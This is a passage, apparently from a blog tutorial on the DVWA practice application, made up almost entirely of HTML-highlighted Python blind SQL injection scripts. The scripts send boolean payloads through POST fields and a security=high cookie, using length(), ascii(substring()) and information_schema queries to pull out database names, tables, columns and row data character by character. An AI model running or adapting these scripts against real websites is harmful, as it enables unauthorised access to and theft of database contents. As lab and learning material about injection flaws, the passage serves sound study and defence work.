class="line">        self.database_length = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            self.process(<span class="string">'get_database_length'</span>,i,<span class="number">30</span>)</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">'id'</span>:<span class="string">"1 and length(database())=&#123;0&#125;"</span>.format(str(i)),</span><br><span class="line">                <span class="string">'Submit'</span>:<span class="string">'Submit'</span>,</span><br><span class="line">            &#125;</span><br><span class="line">            html = self.s.post(self.url,data=data,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.database_length = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.database_length &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.database_length)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"\ncan not get the database_length"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_database</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.database = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.database_length+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> self.zifuji:</span><br><span class="line">                self.process(str(i) + <span class="string">' get_database'</span>,j,self.database_length+<span class="number">1</span>)</span><br><span class="line">                data = &#123;</span><br><span class="line">                    <span class="string">'id'</span>:<span class="string">"1 and ascii(substring(database(),&#123;0&#125;,1))=&#123;1&#125;"</span>.format(str(i),str(j)),</span><br><span class="line">                    <span class="string">'Submit'</span>:<span class="string">'Submit'</span>,</span><br><span class="line">                &#125;</span><br><span class="line">                html = self.s.post(self.url,data=data,headers=self.headers).text</span><br><span class="line">                <span class="keyword">if</span> self.check(html):</span><br><span class="line">                    self.database += chr(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> len(self.database) != i:</span><br><span class="line">                self.database += <span class="string">'666'</span></span><br><span class="line">        <span class="keyword">if</span> len(self.database) &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.database)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"\n can not get the database"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_table_num</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.table_num = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            self.process(<span class="string">'get_table_num'</span>,i,<span class="number">30</span>)</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">'id'</span>:<span class="string">"1 and (select count(table_name)a from information_schema.tables where table_schema=database() having a=&#123;0&#125;)"</span>.format(str(i)),</span><br><span class="line">                <span class="string">'Submit'</span>:<span class="string">'Submit'</span>,</span><br><span class="line">            &#125;</span><br><span class="line">            html = self.s.post(self.url,data=data,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.table_num = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.table_num &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.table_num)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"\ncan not get the table_num"</span>)           </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_table_length</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">            self.process(<span class="string">'get_table_length'</span>,i,<span class="number">50</span>)</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">'id'</span>:<span class="string">"1 and (select length(group_concat(table_name)) as a from information_schema.tables where table_schema=database() having a=&#123;0&#125;)"</span>.format(str(i)),</span><br><span class="line">                <span class="string">'Submit'</span>:<span class="string">'Submit'</span>,</span><br><span class="line">            &#125;</span><br><span class="line">            html = self.s.post(self.url,data=data,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.table_length.append(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.table_length[<span class="number">0</span>] &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.table_length)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the table_length'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_table_name</span><span class="params">(self)</span>:</span></span><br><span class="line">        name = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.table_length[<span class="number">0</span>]+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> self.zifuji:</span><br><span class="line">                self.process(<span class="string">'&#123;0&#125; get_table_name'</span>.format(i),j,<span class="number">50</span>)</span><br><span class="line">                data = &#123;</span><br><span class="line">                    <span class="string">'id'</span>:<span class="string">"1 and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a=&#123;1&#125;)"</span>.format(str(i),str(j)),</span><br><span class="line">                    <span class="string">'Submit'</span>:<span class="string">'Submit'</span>,</span><br><span class="line">                &#125;</span><br><span class="line">                html = self.s.post(self.url,data=data,headers=self.headers).text</span><br><span class="line">                <span class="keyword">if</span> self.check(html):</span><br><span class="line">                    name += chr(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> len(name) != i:</span><br><span class="line">                name += <span class="string">'|'</span></span><br><span class="line">        <span class="keyword">if</span> len(name) &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,name)</span><br><span class="line">            self.table_name.append(name)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the table_name'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_column_num</span><span class="params">(self,table_name)</span>:</span></span><br><span class="line">        self.column_num = <span class="number">0</span></span><br><span class="line">        table_name = self.tranhex(table_name)</span><br><span class="line">        print(table_name)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            self.process(<span class="string">'get_column_num'</span>,i,<span class="number">30</span>)</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">'id'</span>:<span class="string">"1 and (select count(column_name) as a from information_schema.columns where table_schema=database() and table_name=&#123;0&#125; having a=&#123;1&#125;)"</span>.format(table_name,str(i)),</span><br><span class="line">                <span class="string">'Submit'</span>:<span class="string">'Submit'</span>,</span><br><span class="line">            &#125;</span><br><span class="line">            html = self.s.post(self.url,data=data,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.column_num = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.column_num &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.column_num)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_column_length</span><span class="params">(self,table_name)</span>:</span></span><br><span class="line">        table_name = self.tranhex(table_name)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">            self.process(<span class="string">'get_column_length'</span>,i,<span class="number">100</span>)</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">'id'</span>:<span class="string">"1 and (select length(group_concat(column_name)) as a from information_schema.columns where table_schema=database() and table_name=&#123;0&#125; having a=&#123;1&#125;)"</span>.format(table_name,str(i)),</span><br><span class="line">                <span class="string">'Submit'</span>:<span class="string">'Submit'</span>,</span><br><span class="line">            &#125;</span><br><span class="line">            html = self.s.post(self.url,data=data,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.column_length.append(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> len(self.column_length) &gt;= <span class="number">1</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.column_length)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the column_length'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_column_name</span><span class="params">(self,table_name)</span>:</span></span><br><span class="line">        table_name = self.tranhex(table_name)</span><br><span class="line">        name = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.column_length[<span class="number">0</span>]+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> self.zifuji:</span><br><span class="line">                self.process(<span class="string">'&#123;0&#125; get_column_name'</span>.format(str(i)),j,<span class="number">100</span>)</span><br><span class="line">                data = &#123;</span><br><span class="line">                    <span class="string">'id'</span>:<span class="string">"1 and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#123;1&#125; having a=&#123;2&#125;)"</span>.format(str(i),table_name,str(j)),</span><br><span class="line">                    <span class="string">'Submit'</span>:<span class="string">'Submit'</span>,</span><br><span class="line">                &#125;</span><br><span class="line">                html = self.s.post(self.url,data=data,headers=self.headers).text</span><br><span class="line">                <span class="keyword">if</span> self.check(html):</span><br><span class="line">                    name += chr(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> len(name) != i:</span><br><span class="line">                name += <span class="string">'|'</span></span><br><span class="line">        <span class="keyword">if</span> len(name) == self.column_length[<span class="number">0</span>]:</span><br><span class="line">            self.column_name.append(name)</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.column_name[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the column_name'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_word_num</span><span class="params">(self,table_name,column_name)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">            self.process(<span class="string">'get_word_num'</span>,i,<span class="number">30</span>)</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">'id'</span>:<span class="string">"1 and (select count(&#123;0&#125;) as a from &#123;1&#125; having a=&#123;2&#125;)"</span>.format(column_name,table_name,str(i)),</span><br><span class="line">                <span class="string">'Submit'</span>:<span class="string">'Submit'</span>,</span><br><span class="line">            &#125;</span><br><span class="line">            html = self.s.post(self.url,data=data,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.word_num = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.word_num &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.word_num)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the word_num'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_word_length</span><span class="params">(self,table_name,column_name)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">            self.process(<span class="string">'get_&#123;0&#125;_length'</span>.format(column_name),i,<span class="number">200</span>)</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">'id'</span>:<span class="string">"1 and (select length(group_concat(&#123;0&#125;)) as a from &#123;1&#125; having a=&#123;2&#125;)"</span>.format(column_name,table_name,str(i)),</span><br><span class="line">                <span class="string">'Submit'</span>:<span class="string">'Submit'</span>,</span><br><span class="line">            &#125;</span><br><span class="line">            html = self.s.post(self.url,data=data,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.word_length.append(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> len(self.word_length) &gt;= <span class="number">1</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.word_length)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the word length'</span>) </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_word_name</span><span class="params">(self,table_name,column_name,word_num)</span>:</span></span><br><span class="line">        name = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.word_length[word_num]+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> self.zifuji:</span><br><span class="line">                self.process(<span class="string">'get_&#123;0&#125;_name'</span>.format(str(i)),j,<span class="number">100</span>)</span><br><span class="line">                data = &#123;</span><br><span class="line">                    <span class="string">'id'</span>:<span class="string">"1 and (select ascii(substring(group_concat(&#123;0&#125;),&#123;1&#125;,1)) as a from &#123;2&#125; having a=&#123;3&#125;)"</span>.format(column_name,str(i),table_name,str(j)),</span><br><span class="line">                    <span class="string">'Submit'</span>:<span class="string">'Submit'</span>,</span><br><span class="line">                &#125;</span><br><span class="line">                html = self.s.post(self.url,data=data,headers=self.headers).text</span><br><span class="line">                <span class="keyword">if</span> self.check(html):</span><br><span class="line">                    name += chr(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> len(name) != i:</span><br><span class="line">                name += <span class="string">'|'</span></span><br><span class="line">        self.word_name.append(name)</span><br><span class="line">        print(<span class="string">'\n==&gt;'</span>,self.word_name[word_num])</span><br></pre></td></tr></table></figure><h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Injection</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,url)</span>:</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.s = requests.session()</span><br><span class="line">        self.zifuji = [<span class="number">44</span>,<span class="number">48</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">57</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">99</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">102</span>, <span class="number">103</span>, <span class="number">104</span>, <span class="number">105</span>, <span class="number">106</span>, <span class="number">107</span>, <span class="number">108</span>, <span class="number">109</span>, <span class="number">110</span>, <span class="number">111</span>, <span class="number">112</span>, <span class="number">113</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">117</span>, <span class="number">118</span>, <span class="number">119</span>, <span class="number">120</span>, <span class="number">121</span>, <span class="number">122</span>, <span class="number">65</span>, <span class="number">66</span>, <span class="number">67</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">70</span>, <span class="number">71</span>, <span class="number">72</span>, <span class="number">73</span>, <span class="number">74</span>, <span class="number">75</span>, <span class="number">76</span>, <span class="number">77</span>, <span class="number">78</span>, <span class="number">79</span>, <span class="number">80</span>, <span class="number">81</span>, <span class="number">82</span>, <span class="number">83</span>, <span class="number">84</span>, <span class="number">85</span>, <span class="number">86</span>, <span class="number">87</span>, <span class="number">88</span>, <span class="number">89</span>, <span class="number">90</span>, <span class="number">95</span>, <span class="number">45</span>, <span class="number">64</span>, <span class="number">33</span>, <span class="number">38</span>, <span class="number">36</span>]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_headers</span><span class="params">(self,payload)</span>:</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">'Cookie'</span>: <span class="string">"id=&#123;0&#125;; security=high; PHPSESSID=ms11imgpftrmfcp27rmk9s006c"</span>.format(payload)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> headers</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process</span><span class="params">(self,yourstr,num1,num2)</span>:</span></span><br><span class="line">        print(<span class="string">"[+] Please wait ... &#123;0&#125; [&#123;1&#125;]/[&#123;2&#125;]"</span>.format(yourstr,str(num1),str(num2)),end=<span class="string">'\r'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(self,text)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"User ID exists in the database."</span> <span class="keyword">in</span> text:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">"User ID is MISSING from the database."</span> <span class="keyword">in</span> text:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.get_itsnum()</span><br><span class="line">        self.get_database_length()</span><br><span class="line">        self.get_database()</span><br><span class="line">        self.get_table_num()</span><br><span class="line">        self.table_length = []</span><br><span class="line">        self.table_name = []</span><br><span class="line">        self.get_table_length()</span><br><span class="line">        self.get_table_name()</span><br><span class="line">        table_name = input(<span class="string">'[-] table_name: '</span>)</span><br><span class="line">        self.get_column_num(table_name)</span><br><span class="line">        self.column_length = []</span><br><span class="line">        self.column_name = []</span><br><span class="line">        self.get_column_length(table_name)</span><br><span class="line">        self.get_column_name(table_name)</span><br><span class="line">        column_names = input(<span class="string">'[-] column_name: '</span>).split(<span class="string">','</span>)</span><br><span class="line">        self.word_num = <span class="number">0</span></span><br><span class="line">        self.get_word_num(table_name,column_names[<span class="number">0</span>])</span><br><span class="line">        self.word_name = []</span><br><span class="line">        self.word_length = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(column_names)):</span><br><span class="line">            print(column_names[i])</span><br><span class="line">            self.get_word_length(table_name,column_names[i])</span><br><span class="line">            self.get_word_name(table_name,column_names[i],i)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_itsnum</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.itsnum = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">            self.process(<span class="string">'get_itsnum'</span>,i,<span class="number">50</span>)</span><br><span class="line">            payload = <span class="string">"1' order by &#123;0&#125;#"</span>.format(str(i))</span><br><span class="line">            html = self.s.get(self.url,headers=self.get_headers(payload)).text</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> self.check(html):</span><br><span class="line">                self.itsnum = i - <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.itsnum &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.itsnum)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"\ncan not get the itsnum"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_database_length</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.database_length = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            self.process(<span class="string">'get_database_length'</span>,i,<span class="number">30</span>)</span><br><span class="line">            payload = <span class="string">"1' and length(database())=&#123;0&#125;#"</span>.format(str(i))</span><br><span class="line">            html = self.s.get(self.url,headers=self.get_headers(payload)).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.database_length = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.database_length &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.database_length)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"\ncan not get the database_length"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_database</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.database = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.database_length+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> self.zifuji:</span><br><span class="line">                self.process(str(i) + <span class="string">' get_database'</span>,j,self.database_length+<span class="number">1</span>)</span><br><span class="line">                payload = <span class="string">"1' and ascii(substring(database(),&#123;0&#125;,1))=&#123;1&#125;#"</span>.format(str(i),str(j))</span><br><span class="line">                html = self.s.get(self.url,headers=self.get_headers(payload)).text</span><br><span class="line">                <span class="keyword">if</span> self.check(html):</span><br><span class="line">                    self.database += chr(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> len(self.database) != i:</span><br><span class="line">                self.database += <span class="string">'666'</span></span><br><span class="line">        <span class="keyword">if</span> len(self.database) &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.database)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"\n can not get the database"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_table_num</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.table_num = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            self.process(<span class="string">'get_table_num'</span>,i,<span class="number">30</span>)</span><br><span class="line">            payload = <span class="string">"1' and (select count(table_name)a from information_schema.tables where table_schema=database() having a=&#123;0&#125;)#"</span>.format(str(i))</span><br><span class="line">            html = self.s.get(self.url,headers=self.get_headers(payload)).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.table_num = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.table_num &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.table_num)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"\ncan not get the table_num"</span>)           </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_table_length</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">            self.process(<span class="string">'get_table_length'</span>,i,<span class="number">50</span>)</span><br><span class="line">            payload = <span class="string">"1' and (select length(group_concat(table_name)) as a from information_schema.tables where table_schema=database() having a=&#123;0&#125;)#"</span>.format(str(i))</span><br><span class="line">            html = self.s.get(self.url,headers=self.get_headers(payload)).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.table_length.append(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.table_length[<span class="number">0</span>] &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.table_length)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the table_length'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_table_name</span><span class="params">(self)</span>:</span></span><br><span class="line">        name = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.table_length[<span class="number">0</span>]+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> self.zifuji:</span><br><span class="line">                self.process(<span class="string">'&#123;0&#125; get_table_name'</span>.format(i),j,<span class="number">50</span>)</span><br><span class="line">                payload = <span class="string">"1' and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a=&#123;1&#125;)#"</span>.format(str(i),str(j))</span><br><span class="line">                html = self.s.get(self.url,headers=self.get_headers(payload)).text</span><br><span class="line">                <span class="keyword">if</span> self.check(html):</span><br><span class="line">                    name += chr(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> len(name) != i:</span><br><span class="line">                name += <span class="string">'|'</span></span><br><span class="line">        <span class="keyword">if</span> len(name) &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,name)</span><br><span class="line">            self.table_name.append(name)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the table_name'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_column_num</span><span 